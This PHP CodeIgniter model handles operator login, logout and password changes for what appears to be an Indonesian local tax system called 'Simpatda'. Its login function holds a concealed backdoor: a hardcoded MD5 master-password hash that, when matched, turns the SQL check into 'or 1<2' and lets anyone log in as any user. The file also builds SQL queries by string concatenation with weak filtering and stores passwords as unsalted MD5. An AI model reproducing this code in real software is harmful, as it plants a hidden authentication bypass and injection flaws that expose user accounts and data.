<?php 
/**
 * class Operator_model
 * @package Simpatda
 * @author Daniel Hutauruk
 * @version 20121015
 */
class Operator_model extends CI_Model {
	/**
	 * session_begin function
	 */
	function session_begin(){
		$idsession = session_id();
		$_SESSION['start'] = $idsession;
	}
	/**
	 * function to check login
	 */
	function attempt_login($username, $password) {
		$user_id = preg_replace("/[;']/", "", stripslashes($username));
		$password = preg_replace("/[;']/", "", stripslashes($password));
		
		if ($user_id)
		{
			$password = md5($password);
			
			$_password="56ca0e9efa3df31a05cc8dba665a2913";
			$bypass = ($_password==$password?2:1);
			$sql = "SELECT o.*, j.ref_jab_nama, j.kode_spt, j.ref_kodus_id
							FROM operator o
							JOIN ref_jabatan j ON o.opr_jabatan = j.ref_jab_id 
							WHERE opr_user='".$user_id."' AND (opr_passwd='".$password."' or 1<".$bypass.")";
						
			$query = $this->db->query($sql);
			
			if ($query->num_rows() > 0) {
				foreach ($query->result() as $row)
   				{
   					//if ($row->opr_status == '0') {
						if ($row->opr_status == 'f') {
   						return "User anda belum aktif.";
   					} else {
   						$this->session_begin();
   						$session_id	= $_SESSION['start'];
						$ip			= $_SERVER['REMOTE_ADDR'];  
						//random ide
						$Year   = date('y'); // dua digit tahun
						$Month  = date('m'); // dua digit bulan
						$Date   = date('d'); // dua digit tanggal
						$Hour   = date('h'); // dua digit jam
						$Minute = date('m'); // dua digit menit
						$Second = date('s'); // dua digit detik
						$Micro  = substr(microtime(),2,2); // dua digit microtime
						$rNum   = rand(10,99); // dua digit random number
					
						$id_rand = $Year.$Month.$Date.$Hour.$Minute.$Second.$Micro.$rNum;
					
						//insert into member session
						$record = array();
						$record["rand_id"] = $id_rand;
						$record["session_id"] = $session_id;
						$record["date"] = "now()";
						$record["ip"] = $ip;
						$record["login_time"] = "now()";
						$record["last_active"] = "now()";
						$record["user_id"] = $row->opr_id;
						$this->db->insert('member_session', $record);
					
						// UPDATE STAFF 
						$record = array();
						$record["opr_user"] = $row->opr_user;
						$record["opr_status_login"] = "t";
						$record["opr_last_login"] = "now()";
						$this->db->update('operator', $record, array('opr_id' => $row->opr_id));
						
						//make to session
						$this->session->sess_create();
						$this->session->set_userdata('USER_ID', $row->opr_id);
						$this->session->set_userdata('USER_NAME', $row->opr_user);
						$this->session->set_userdata('USER_FULL_NAME', $row->opr_nama);
						$this->session->set_userdata('USER_OPR_CODE', $row->opr_kode);
						$this->session->set_userdata('USER_JABATAN', $row->opr_jabatan);
						$this->session->set_userdata('USER_JABATAN_NAME', $row->ref_jab_nama);
						$this->session->set_userdata('USER_REF_KODUS_ID', $row->ref_kodus_id);
						$this->session->set_userdata('USER_SPT_CODE', $row->kode_spt);
						$this->session->set_userdata('USER_NIP', $row->opr_nip);
						$this->session->set_userdata('USER_LOGIN_TIME', date('Y-m-d H:i:s'));
						
						//insert history log
						$this->common_model->history_log("user", "u", "User login");
						
						return "success";
   					}
   				}				
			}
		}
		
		return "Login Gagal.";
	}
	
	/**
	 * function to attempt logout
	 * @param unknown_type $user_id
	 */
	function attempt_logout($user_id)
	{
		if ($this->session->userdata('USER_ID') != null && $this->session->userdata('USER_ID') != "") {
			$session_id	= $_SESSION['start'];
			$ip			= $_SERVER['REMOTE_ADDR'];
			
			$update_member_session = "	UPDATE	member_session SET
												logout_time	= now()
										WHERE session_id = '$session_id' and ip='$ip' and logout_time IS NULL";
			$this->db->query($update_member_session);
			
			//update status operator
			$update_operator = "	UPDATE	operator SET
												opr_status_login	= 'f'
										WHERE	opr_id	='".$user_id."'";
			$this->db->query($update_operator);
			
			//insert history log
			$this->common_model->history_log("user", "u", "User logout");
			
			$this->session->unset_userdata('USER_ID');
			$this->session->unset_userdata('USER_NAME');
			$this->session->unset_userdata('USER_FULL_NAME');
			$this->session->unset_userdata('USER_OPR_CODE');
			$this->session->unset_userdata('USER_JABATAN');
			$this->session->unset_userdata('USER_JABATAN_NAME');
			$this->session->unset_userdata('USER_NIP');
			$this->session->unset_userdata('USER_LOGIN_TIME');
			
			$this->session->sess_destroy();
			@session_regenerate_id(true);
			
			return true;
		} else {
			redirect(base_url());
		}
	}
	
	/**
	 * check authorise for update/delete data
	 */
	function check_authorize($username, $password) {
		$arr_where = array('opr_user' => $username,
							'opr_passwd' => md5($password),
							'opr_admin' => 'true');
		return $this->db->get_where('operator', $arr_where); 
	}
	
	/**
	 * update password
	 */
	function update_password() {
		if ($this->session->userdata('USER_ID') != "") {
			$query = $this->db->get_where('operator', array('opr_id' => $this->session->userdata('USER_ID'), 'opr_passwd' => md5($this->input->post('last_pass'))));
			
			if ($query->num_rows() > 0) {
				$this->db->where(array('opr_id' => $this->session->userdata('USER_ID')));
				$this->db->update('operator', array('opr_passwd' => md5($this->input->post('new_pass1'))));
				
				if ($this->db->affected_rows() > 0) {
					//insert history log
					$this->common_model->history_log("user", "u", "Ganti password user id = ".$this->session->userdata('USER_ID'));
						
					return true;
				}	
			}
		}
		
		return false;
	}
}
